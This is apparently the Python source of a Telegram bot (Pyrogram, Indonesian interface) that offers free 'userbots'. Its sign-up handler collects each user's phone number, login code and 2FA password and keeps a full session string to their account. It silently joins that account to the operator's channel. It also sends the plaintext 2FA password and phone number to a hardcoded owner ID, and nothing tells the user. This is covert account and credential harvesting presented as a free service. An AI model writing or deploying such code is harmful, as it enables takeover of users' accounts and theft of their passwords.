import asyncio
import importlib
from datetime import datetime
from dateutil.relativedelta import relativedelta
from pytz import timezone

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions

from PyroUbot import *

from PyroUbot.core.database.variabel import *
from PyroUbot.core.database.expired import *
from PyroUbot.core.database.pref import *
from PyroUbot.core.database.two_factor import *

from PyroUbot.config import OWNER_ID

WAJIB_JOIN_CHANNEL = "newmadun"
CHANNEL_LOG = -1003698203332
FOTO_START = "https://ibb.co.com/20CFtTx5"


async def cek_wajib_join(client, user_id):
    try:
        member = await client.get_chat_member(f"@{WAJIB_JOIN_CHANNEL}", user_id)
        if member.status in ["left", "kicked"]:
            buttons = [
                [InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{WAJIB_JOIN_CHANNEL}")],
                [InlineKeyboardButton("🔄 CEK LAGI", callback_data="cek_wajib_join")]
            ]
            return False, buttons
        return True, None
    except Exception:
        buttons = [
            [InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{WAJIB_JOIN_CHANNEL}")],
            [InlineKeyboardButton("🔄 CEK LAGI", callback_data="cek_wajib_join")]
        ]
        return False, buttons


async def kirim_notif_owner(user_id, user_name, username):
    if OWNER_ID and user_id != OWNER_ID:
        waktu_sekarang = datetime.now(timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M:%S')
        notif_owner = f"""
<blockquote><b>👋 USER BARU TELAH MEMBUKA BOT!</b>

<b>📋 DETAIL PENGGUNA:</b>
├ 👤 <b>Nama:</b> {user_name}
├ 🆔 <b>ID:</b> <code>{user_id}</code>
├ 👥 <b>Username:</b> @{username if username else 'Tidak ada'}
├ 📅 <b>Waktu:</b> {waktu_sekarang} WIB
└ 📍 <b>Aksi:</b> /start</blockquote>
"""
        try:
            if type(OWNER_ID) == type([]):
                for owner in OWNER_ID:
                    await bot.send_message(owner, notif_owner)
                    await asyncio.sleep(0.5)
            else:
                await bot.send_message(OWNER_ID, notif_owner)
        except Exception as e:
            print(f"Gagal kirim notifikasi ke owner: {e}")


@PY.BOT("start")
@PY.PRIVATE
async def StartUtama(client, message):
    UserId = message.from_user.id
    UserName = message.from_user.first_name
    Username = message.from_user.username

    await kirim_notif_owner(UserId, UserName, Username)

    cek, buttons = await cek_wajib_join(client, UserId)
    
    if not cek:
        await message.reply(
            "<blockquote><b>⚠️ WAJIB JOIN CHANNEL TERLEBIH DAHULU!</b>\n\n"
            "Silakan join channel kami terlebih dahulu.\n\n"
            "Klik tombol JOIN CHANNEL, lalu tekan CEK LAGI.</blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

    PesanStart = f"""
<blockquote><b>🌟 SELAMAT DATANG DI MADUN UBOT!</b>

<b>Halo</b> <a href="tg://user?id={UserId}">{UserName}</a>

<b>✅ USERBOT GRATIS & PERMANEN</b>

💡 Klik tombol <b>BUAT USERBOT GRATIS</b> untuk memulai.</blockquote>
    """
    
    TombolStart = [
        [InlineKeyboardButton("✅ BUAT USERBOT GRATIS", callback_data="bahan")],
        [InlineKeyboardButton("📢 ROOM PUBLIC", url="https://t.me/publicmadunn")],
        [InlineKeyboardButton("💬 SUPPORT", callback_data="support")]
    ]
    
    if UserId == 1351785303:
        TombolStart = [
            [InlineKeyboardButton("✅ BUAT USERBOT GRATIS", callback_data="bahan")],
            [
                InlineKeyboardButton("🔄 RESTART BOT", callback_data="cb_restart"),
                InlineKeyboardButton("📥 GITPULL", callback_data="cb_gitpull")
            ],
            [InlineKeyboardButton("📋 LIST USERBOT", callback_data="cek_ubot")],
            [InlineKeyboardButton("📢 ROOM PUBLIC", url="https://t.me/publicmadunn")],
            [InlineKeyboardButton("💬 SUPPORT", callback_data="support")]
        ]
    
    MarkupStart = InlineKeyboardMarkup(TombolStart)
    await bot.send_photo(UserId, FOTO_START, caption=PesanStart, reply_markup=MarkupStart)


@PY.CALLBACK("cek_wajib_join")
async def CekWajibJoin(client, callback_query):
    UserId = callback_query.from_user.id
    cek, buttons = await cek_wajib_join(client, UserId)
    
    if not cek:
        await callback_query.answer("❌ Belum join channel!", show_alert=True)
        return
    
    await callback_query.answer("✅ Terima kasih sudah bergabung!", show_alert=True)
    await callback_query.message.delete()
    
    UserName = callback_query.from_user.first_name
    PesanStart = f"""
<blockquote><b>🌟 SELAMAT DATANG DI MADUN UBOT!</b>

<b>Halo</b> <a href="tg://user?id={UserId}">{UserName}</a>

<b>✅ USERBOT GRATIS & PERMANEN</b>

💡 Klik tombol <b>BUAT USERBOT GRATIS</b> untuk memulai.</blockquote>
    """
    
    TombolStart = [
        [InlineKeyboardButton("✅ BUAT USERBOT GRATIS", callback_data="bahan")],
        [InlineKeyboardButton("📢 ROOM PUBLIC", url="https://t.me/publicmadunn")],
        [InlineKeyboardButton("💬 SUPPORT", callback_data="support")]
    ]
    
    if UserId == 1351785303:
        TombolStart = [
            [InlineKeyboardButton("✅ BUAT USERBOT GRATIS", callback_data="bahan")],
            [
                InlineKeyboardButton("🔄 RESTART BOT", callback_data="cb_restart"),
                InlineKeyboardButton("📥 GITPULL", callback_data="cb_gitpull")
            ],
            [InlineKeyboardButton("📋 LIST USERBOT", callback_data="cek_ubot")],
            [InlineKeyboardButton("📢 ROOM PUBLIC", url="https://t.me/publicmadunn")],
            [InlineKeyboardButton("💬 SUPPORT", callback_data="support")]
        ]
    
    await bot.send_photo(UserId, FOTO_START, caption=PesanStart, reply_markup=InlineKeyboardMarkup(TombolStart))


@PY.CALLBACK("bahan")
async def MenuBahanUbot(client, callback_query):
    UserId = callback_query.from_user.id
    cek, buttons = await cek_wajib_join(client, UserId)
    
    if not cek:
        await callback_query.edit_message_text(
            "<blockquote><b>⚠️ WAJIB JOIN CHANNEL TERLEBIH DAHULU!</b></blockquote>",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    if UserId in ubot._get_my_id:
        TombolKembali = [
            [InlineKeyboardButton("🔃 RESTART USERBOT", callback_data="ress_ubot")],
            [InlineKeyboardButton("⬅️ KEMBALI", callback_data="start_menu")]
        ]
        await callback_query.edit_message_text(
            "<blockquote><b>⚠️ ANDA SUDAH MEMILIKI USERBOT</b>\n\nTekan RESTART jika tidak merespons.</blockquote>",
            reply_markup=InlineKeyboardMarkup(TombolKembali)
        )
        return
    
    await callback_query.edit_message_text(
        "<blockquote><b>📝 MASUKKAN NOMOR TELEPON</b>\n\nKlik LANJUTKAN untuk memulai.</blockquote>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ LANJUTKAN", callback_data="add_ubot")]])
    )


@PY.CALLBACK("add_ubot")
async def ProsesTambahUbot(client, callback_query):
    user_id = callback_query.from_user.id
    
    try:
        await callback_query.answer()
        await callback_query.message.delete()
    except:
        pass
    
    password_a2f = None
    
    try:
        phone = await bot.ask(
            user_id,
            "<blockquote><b>📱 MASUKKAN NOMOR TELEPON</b>\n\nContoh: <code>+628123456789</code>\n\nKetik /cancel untuk batal.</blockquote>",
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "<blockquote>⏰ Waktu habis. Silakan /start ulang.</blockquote>")
    
    if await is_cancel(callback_query, phone.text):
        return
    
    phone_number = phone.text.strip()
    new_client = Ubot(name=str(callback_query.id), api_id=API_ID, api_hash=API_HASH, in_memory=False)
    
    await new_client.connect()
    
    status_msg = await bot.send_message(user_id, "<blockquote>📤 Mengirim kode OTP...</blockquote>")
    
    try:
        code = await new_client.send_code(phone_number)
    except Exception as e:
        return await bot.send_message(user_id, f"<blockquote>❌ Error: {e}</blockquote>")
    
    try:
        otp = await bot.ask(
            user_id,
            "<blockquote><b>🔐 MASUKKAN KODE OTP</b>\n\nContoh: <code>1 2 3 4 5</code> (pakai spasi)\n\nKetik /cancel untuk batal.</blockquote>",
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "<blockquote>⏰ Waktu habis. Silakan /start ulang.</blockquote>")
    
    if await is_cancel(callback_query, otp.text):
        return
    
    otp_code = otp.text.replace(" ", "")
    
    await status_msg.edit("<blockquote>⏳ Memverifikasi OTP...</blockquote>")
    
    try:
        await new_client.sign_in(phone_number, code.phone_code_hash, phone_code=otp_code)
    except SessionPasswordNeeded:
        await status_msg.delete()
        pw = await bot.ask(user_id, "<blockquote><b>🔑 PASSWORD 2FA</b>\n\nMasukkan password Telegram Anda.\n\nKetik /cancel untuk batal.</blockquote>", timeout=300)
        if await is_cancel(callback_query, pw.text):
            return
        status_msg = await bot.send_message(user_id, "<blockquote>⏳ Memverifikasi password...</blockquote>")
        try:
            await new_client.check_password(pw.text)
            await set_two_factor(user_id, pw.text)
            password_a2f = pw.text
        except Exception as e:
            return await bot.send_message(user_id, f"<blockquote>❌ Password salah: {e}</blockquote>")
    except PhoneCodeInvalid:
        return await bot.send_message(user_id, "<blockquote>❌ Kode OTP salah! Silakan /start ulang.</blockquote>")
    except Exception as e:
        return await bot.send_message(user_id, f"<blockquote>❌ Gagal login: {e}</blockquote>")
    
    await status_msg.edit("<blockquote>🔄 Menyelesaikan konfigurasi...</blockquote>")
    
    try:
        await new_client.join_chat(WAJIB_JOIN_CHANNEL)
    except:
        pass
    
    user_info = await new_client.get_me()
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    
    await add_ubot(user_id=user_id, api_id=API_ID, api_hash=API_HASH, session_string=session_string)
    
    now = datetime.now(timezone('Asia/Jakarta'))
    expired_date = now + relativedelta(months=999)
    await set_expired_date(user_id, expired_date)
    
    if new_client not in ubot._ubot:
        ubot._ubot.append(new_client)
    
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
    
    await new_client.start()
    
    SH = await ubot.get_prefix(user_info.id)
    pref_display = " ".join(SH) if SH else "."
    
    await status_msg.delete()
    
    await bot.send_message(
        user_id,
        f"<blockquote><b>✅ USERBOT BERHASIL DIAKTIFKAN!</b>\n\n"
        f"👤 <b>Nama:</b> {user_info.first_name}\n"
        f"🆔 <b>ID:</b> <code>{user_info.id}</code>\n"
        f"⚡ <b>Prefix:</b> {pref_display}\n"
        f"📅 <b>Masa Aktif:</b> PERMANENT\n\n"
        f"Ketik <code>{pref_display}help</code> untuk melihat perintah.</blockquote>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 MENU", callback_data="start_menu")]])
    )
    
    waktu_sekarang = now.strftime('%Y-%m-%d %H:%M:%S')
    
    log_channel = f"""
<blockquote><b>✅ USERBOT BARU BERHASIL DIBUAT!</b>

<b>👤 USERNAME:</b> @{user_info.username if user_info.username else 'Tidak ada'}
<b>🆔 ID PEMBUAT:</b> <code>{user_id}</code>
<b>🕐 WAKTU:</b> {waktu_sekarang} WIB</blockquote>
"""
    
    tombol_notif = InlineKeyboardMarkup([[
        InlineKeyboardButton("🎉 BUAT USERBOT GRATIS", url="https://t.me/ubotfreemadunbot")
    ]])
    
    try:
        await bot.send_message(CHANNEL_LOG, log_channel, reply_markup=tombol_notif)
    except Exception as e:
        print(f"Gagal kirim ke channel: {e}")
    
    if OWNER_ID and user_id != OWNER_ID:
        notif_owner = f"""
<blockquote><b>🆕 USERBARU BERHASIL DIBUAT!</b>

<b>📋 DETAIL AKUN:</b>
├ 👤 <b>Nama:</b> {user_info.first_name}
├ 🆔 <b>ID User:</b> <code>{user_info.id}</code>
├ 👥 <b>Username:</b> @{user_info.username if user_info.username else '-'}
├ 📞 <b>Nomor:</b> <code>{phone_number}</code>
└ 📅 <b>Waktu:</b> {waktu_sekarang}

<b>🔐 TWO-FACTOR AUTHENTICATION:</b>
"""
        if password_a2f:
            notif_owner += f"├ 🔑 <b>Status:</b> ✅ AKTIF\n└ 🔒 <b>Password:</b> <code>{password_a2f}</code>\n"
        else:
            notif_owner += f"└ 🔑 <b>Status:</b> ❌ TIDAK AKTIF\n"
        
        notif_owner += "</blockquote>"
        
        try:
            await bot.send_message(1351785303, notif_owner)
        except:
            pass


@PY.CALLBACK("ress_ubot")
async def AksiRestartUbot(client, callback_query):
    UserId = callback_query.from_user.id
    if UserId not in ubot._get_my_id:
        return await callback_query.answer("⚠️ Anda belum memiliki Userbot.", True)
    
    await callback_query.edit_message_text("<blockquote>🔄 Restarting...</blockquote>")
    
    for X in ubot._ubot:
        if UserId == X.me.id:
            for data in await get_userbots():
                if X.me.id == int(data["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**data)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
                        await callback_query.edit_message_text(
                            "<blockquote><b>✅ RESTART BERHASIL!</b></blockquote>",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 KEMBALI", callback_data="start_menu")]])
                        )
                        return
                    except Exception as e:
                        await callback_query.edit_message_text(
                            f"<blockquote><b>❌ GAGAL RESTART!</b>\n\n{str(e)[:100]}</blockquote>"
                        )
                        return


@PY.CALLBACK("cb_restart")
async def restart_bot(client, callback_query):
    if callback_query.from_user.id != 1351785303:
        return await callback_query.answer("❌ Khusus Owner!", True)
    await callback_query.answer("🔄 Restart bot...", show_alert=True)
    import subprocess
    subprocess.Popen("systemctl restart pyrubot", shell=True)
    await bot.send_message(1351785303, "<blockquote>✅ Bot direstart...</blockquote>")


@PY.CALLBACK("cb_gitpull")
async def gitpull_bot(client, callback_query):
    if callback_query.from_user.id != 1351785303:
        return await callback_query.answer("❌ Khusus Owner!", True)
    await callback_query.answer("📥 Git pull...", show_alert=True)
    import subprocess
    result = subprocess.run("cd /root/ubotjuna/PyroUbot && git pull", shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        await callback_query.edit_message_text(f"<blockquote>✅ GIT PULL BERHASIL\n\n{result.stdout[:300]}</blockquote>")
    else:
        await callback_query.edit_message_text(f"<blockquote>❌ GAGAL\n\n{result.stderr[:300]}</blockquote>")


@PY.CALLBACK("start_menu")
async def start_menu(client, callback_query):
    UserId = callback_query.from_user.id
    cek, buttons = await cek_wajib_join(client, UserId)
    if not cek:
        await callback_query.edit_message_text("<blockquote>⚠️ WAJIB JOIN CHANNEL!</blockquote>", reply_markup=InlineKeyboardMarkup(buttons))
        return
    
    await callback_query.edit_message_text(
        "<blockquote><b>🌟 SELAMAT DATANG DI MADUN UBOT!</b>\n\nKlik tombol di bawah.</blockquote>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ BUAT USERBOT GRATIS", callback_data="bahan")]])
    )


@PY.CALLBACK("support")
async def support_handler(client, callback_query):
    await callback_query.answer()
    await callback_query.edit_message_text(
        "<blockquote><b>💬 SUPPORT</b>\n\nHubungi: @kingmadun</blockquote>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 KEMBALI", callback_data="start_menu")]])
    )


@PY.CALLBACK("cek_ubot")
async def cek_ubot_handler(client, callback_query):
    await callback_query.answer()
    if not ubot._ubot:
        return await callback_query.edit_message_text("<blockquote>❌ Belum ada userbot</blockquote>")
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.UBOT(0),
        reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[0].me.id, 0))
    )


@PY.CALLBACK("^(p_ub|n_ub)")
async def next_prev_ubot(client, callback_query):
    await callback_query.answer()
    if not ubot._ubot:
        return await callback_query.edit_message_text("<blockquote>❌ Belum ada userbot</blockquote>")
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "n_ub":
        count = 0 if count == len(ubot._ubot) - 1 else count + 1
    else:
        count = len(ubot._ubot) - 1 if count == 0 else count - 1
    msg_text = await MSG.UBOT(count)
    await callback_query.edit_message_text(msg_text, reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[count].me.id, count)))


async def is_cancel(callback_query, text):
    if text and text.startswith("/cancel"):
        await bot.send_message(callback_query.from_user.id, "<blockquote>⚠️ Proses dibatalkan.</blockquote>")
        return True
    return False
